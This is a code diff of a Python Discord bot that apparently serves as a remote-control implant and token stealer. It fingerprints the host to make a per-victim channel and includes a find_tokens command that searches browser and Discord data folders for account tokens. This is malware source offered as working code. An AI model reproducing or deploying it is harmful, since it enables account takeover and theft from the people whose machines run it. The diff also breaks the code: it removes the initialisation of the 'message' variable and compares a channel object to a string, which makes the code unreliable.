@@ -1,5 +1,12 @@
+from urllib.request import Request, urlopen
+import discord
+import hashlib
+import platform
+import os
+from discord.ext import commands
 import sys
 import subprocess
+import re
 
 
 required_packages = ["discord", "os", "platform",
@@ -12,12 +19,6 @@ for package in required_packages:
         subprocess.check_call(
             [sys.executable, "-m", "pip", "install", package])
 
-from discord.ext import commands
-import os
-import platform
-import hashlib
-import discord
-from urllib.request import Request, urlopen
 
 intents = discord.Intents.default()
 intents.messages = True
@@ -40,6 +41,7 @@ async def on_ready():
 
     system_info = get_system_info()  # Function to get system information
     hash_object = hashlib.md5(system_info.encode())
+    global channel_name
     channel_name = hash_object.hexdigest()[:7]
     guild = bot.guilds[0]
 
@@ -74,7 +76,7 @@ async def on_message(message):
     if message.author.bot:
         return
 
-    if message.channel != bot.text_channel:
+    if message.channel != channel_name:
         return
 
     await bot.process_commands(message)
@@ -127,13 +129,11 @@ async def find_tokens_command(ctx):
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
     }
 
-    message = '@everyone' if PING_ME else ''
-
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
 
-        message += f'\n**{platform}**\n```\n'
+        message += str(f'\n**{platform}**\n```\n')
 
         tokens = find_tokens(path)
 
